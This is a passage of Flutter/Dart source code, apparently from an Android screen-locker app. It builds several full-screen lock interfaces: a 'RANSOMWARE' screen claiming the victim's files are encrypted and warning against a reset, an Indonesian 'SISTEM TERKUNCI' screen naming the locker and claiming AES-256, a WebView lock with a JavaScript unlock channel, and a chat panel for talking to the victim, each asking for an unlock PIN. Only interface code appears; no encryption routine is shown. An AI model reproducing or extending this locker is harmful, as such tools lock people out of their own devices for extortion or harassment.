                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildRansomwareUI() {
    return Container(
      width: double.infinity,
      height: double.infinity,
      color: Colors.black,
      child: Center(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.warning_amber_rounded, color: Colors.red, size: 100),
              const SizedBox(height: 20),
              const Text(
                '💀 RANSOMWARE 💀',
                style: TextStyle(color: Colors.red, fontSize: 32, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 20),
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: Colors.red.withOpacity(0.1),
                  border: Border.all(color: Colors.red),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: Text(
                  _lockMessageLocal,
                  style: const TextStyle(color: Colors.white, fontSize: 14),
                  textAlign: TextAlign.center,
                ),
              ),
              const SizedBox(height: 30),
              const Text(
                '🔐 YOUR FILES HAVE BEEN ENCRYPTED 🔐',
                style: TextStyle(color: Colors.red, fontSize: 16, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 10),
              const Text(
                'DO NOT TRY TO RESTART OR FACTORY RESET',
                style: TextStyle(color: Colors.white70, fontSize: 12),
              ),
              const SizedBox(height: 30),
              Container(
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: Colors.grey[900],
                  borderRadius: BorderRadius.circular(10),
                ),
                child: Column(
                  children: [
                    const Text('UNLOCK CODE:', style: TextStyle(color: Colors.grey)),
                    const SizedBox(height: 10),
                    TextField(
                      controller: _pinCtrl,
                      obscureText: true,
                      keyboardType: TextInputType.number,
                      textAlign: TextAlign.center,
                      style: const TextStyle(color: Colors.red, fontSize: 32, letterSpacing: 10),
                      decoration: InputDecoration(
                        hintText: '****',
                        hintStyle: TextStyle(color: Colors.red.withOpacity(0.3)),
                        border: InputBorder.none,
                      ),
                      onSubmitted: _tryUnlock,
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 20),
              ElevatedButton(
                onPressed: () => _tryUnlock(_pinCtrl.text),
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.red,
                  padding: const EdgeInsets.symmetric(horizontal: 40, vertical: 15),
                ),
                child: const Text('DECRYPT FILES', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
              ),
              if (_wrongPin) ...[
                const SizedBox(height: 20),
                const Text('❌ INVALID UNLOCK CODE ❌', style: TextStyle(color: Colors.red)),
              ],
              const SizedBox(height: 20),
              Text(
                'Locked by: $_lockOwnerName',
                style: const TextStyle(color: Colors.red, fontSize: 12),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildHtmlLockUI() {
    return Container(
      color: Colors.black,
      child: Stack(children: [
        MatrixRainLight(textColor: const Color(0xFFFF0000)),
        WebViewWidget(controller: WebViewController()
          ..setJavaScriptMode(JavaScriptMode.unrestricted)
          ..setBackgroundColor(Colors.transparent)
          ..addJavaScriptChannel('UnlockChannel', onMessageReceived: (JavaScriptMessage message) { _tryUnlock(message.message); })
          ..loadHtmlString(_htmlLockContent)),
      ]),
    );
  }

  // 🔥🔥🔥 BASIC LOCK UI DENGAN NAMA PENGUNCI YANG MUNCUL 🔥🔥🔥
  Widget _buildLockBasicUI() {
    print("🔧 BUILD BASIC LOCK - Owner: $_lockOwnerName");
    
    return Container(
      width: double.infinity,
      height: double.infinity,
      padding: EdgeInsets.zero,
      margin: EdgeInsets.zero,
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [
          const Icon(Icons.lock_outline, color: Colors.red, size: 80),
          const SizedBox(height: 20),
          const Text(
            'SISTEM\nTERKUNCI',
            style: TextStyle(fontSize: 36, color: Colors.red, fontWeight: FontWeight.bold, height: 1.2),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 15),
          
          // 🔥 NAMA PENGUNCI PASTI MUNCUL 🔥
          const Text('🔒 LOCKED BY', style: TextStyle(fontSize: 14, color: Colors.red, fontWeight: FontWeight.w500)),
          const SizedBox(height: 5),
          Text(
            _lockOwnerName.toUpperCase(),
            style: const TextStyle(
              fontSize: 26, 
              color: Color(0xFFFF4444), 
              fontWeight: FontWeight.bold,
              letterSpacing: 3,
              shadows: [
                Shadow(blurRadius: 5, color: Colors.red, offset: Offset(0, 0)),
              ],
            ),
            textAlign: TextAlign.center,
          ),
          
          const SizedBox(height: 30),
          const Text('ENKRIPSI: AES-256 STATUS: AKTIF', style: TextStyle(color: Colors.red, fontSize: 12)),
          const SizedBox(height: 20),
          const Text('!!Tr4sVortex-Projector?!!:', style: TextStyle(color: Colors.white70, fontSize: 11), textAlign: TextAlign.center),
          const SizedBox(height: 5),
          SelectableText('the anonymous hacked', style: TextStyle(color: Colors.red.shade300, fontSize: 12)),
          const SizedBox(height: 40),
          const Text('MASUKKAN KODE DEKRIPSI', style: TextStyle(color: Colors.red, fontSize: 13)),
          const SizedBox(height: 10),
          Container(
            width: 280,
            child: TextField(
              controller: _pinCtrl,
              obscureText: true,
              autofocus: true,
              keyboardType: TextInputType.number,
              textAlign: TextAlign.center,
              style: const TextStyle(color: Colors.red, fontSize: 26, letterSpacing: 10),
              decoration: InputDecoration(
                hintText: '****',
                hintStyle: TextStyle(color: Colors.red.withOpacity(0.3)),
                border: InputBorder.none,
                enabledBorder: InputBorder.none,
                focusedBorder: InputBorder.none,
                contentPadding: const EdgeInsets.symmetric(vertical: 12),
              ),
              onSubmitted: _tryUnlock,
            ),
          ),
          const SizedBox(height: 20),
          SizedBox(
            width: 280,
            child: ElevatedButton(
              onPressed: () => _tryUnlock(_pinCtrl.text),
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.red,
                foregroundColor: Colors.white,
                padding: const EdgeInsets.symmetric(vertical: 14),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(0)),
                elevation: 0,
              ),
              child: const Text('DEKRIPSI SEKARANG', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 14)),
            ),
          ),
          if (_wrongPin) ...[
            const SizedBox(height: 15),
            const Text('KODE SALAH!', style: TextStyle(color: Colors.red, fontSize: 12)),
          ],
          const SizedBox(height: 30),
          Text('Dikendalikan oleh f.society // Project 2501', style: TextStyle(color: Colors.red.shade700, fontSize: 9)),
        ],
      ),
    );
  }

  Widget _buildLockLiveUI(List<Map<String, String>> msgs) {
    return Center(
      child: Container(
        margin: const EdgeInsets.all(20),
        decoration: BoxDecoration(color: Colors.black.withOpacity(0.85), borderRadius: BorderRadius.circular(20), border: Border.all(color: Colors.green, width: 2)),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(16),
              decoration: const BoxDecoration(color: Colors.green, borderRadius: BorderRadius.only(topLeft: Radius.circular(20), topRight: Radius.circular(20))),
              child: Row(children: [const Icon(Icons.lock, color: Colors.black), const SizedBox(width: 10), Expanded(child: Text(_lockMessageLocal, style: const TextStyle(color: Colors.black, fontWeight: FontWeight.bold)))]),
            ),
            SizedBox(
              height: 250,
              child: msgs.isEmpty ? const Center(child: Text('No messages', style: TextStyle(color: Colors.green))) : ListView.builder(
                controller: _chatScroll,
                itemCount: msgs.length,
                itemBuilder: (_, i) {
                  final m = msgs[i];
                  return ListTile(title: Text(m['text'] ?? '', style: const TextStyle(color: Colors.white)), subtitle: Text(m['from'] ?? '', style: const TextStyle(color: Colors.green)));
                },
              ),
            ),
            Padding(
              padding: const EdgeInsets.all(12),
              child: Column(children: [
                Row(children: [
                  Expanded(child: TextField(controller: _chatCtrl, style: const TextStyle(color: Colors.white), decoration: const InputDecoration(hintText: 'Send message...', hintStyle: TextStyle(color: Colors.grey), border: OutlineInputBorder()), onSubmitted: _sendChatReply)),
                  IconButton(icon: const Icon(Icons.send, color: Colors.green), onPressed: () => _sendChatReply(_chatCtrl.text)),
                ]),
                const SizedBox(height: 10),
                Row(children: [
                  Expanded(child: TextField(controller: _pinCtrl, obscureText: true, keyboardType: TextInputType.number, style: const TextStyle(color: Colors.white, fontSize: 20), decoration: const InputDecoration(hintText: 'PIN', hintStyle: TextStyle(color: Colors.grey), border: OutlineInputBorder()), onSubmitted: _tryUnlock)),
                  const SizedBox(width: 10),
                  ElevatedButton(onPressed: () => _tryUnlock(_pinCtrl.text), style: ElevatedButton.styleFrom(backgroundColor: Colors.green), child: const Text('UNLOCK')),
                ]),
              ]),
            ),
          ],
        ),
      ),
    );
  }
}